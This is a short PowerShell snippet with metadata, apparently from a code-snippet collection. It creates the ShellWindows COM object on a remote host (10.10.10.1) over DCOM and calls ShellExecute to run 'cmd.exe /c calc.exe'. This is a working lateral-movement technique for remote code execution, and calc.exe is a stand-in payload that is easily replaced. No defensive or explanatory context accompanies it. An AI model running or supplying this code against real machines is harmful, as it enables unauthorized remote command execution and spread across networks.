---
id: eeda8f52-6036-40d6-9b9a-98f6e03da6dd
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:07.161613+00:00'
updated_at: '2023-04-10T20:25:47.024141+00:00'
---

# Code Snippet eeda8f52

**Language**: ps1

```ps1
$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"10.10.10.1")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```
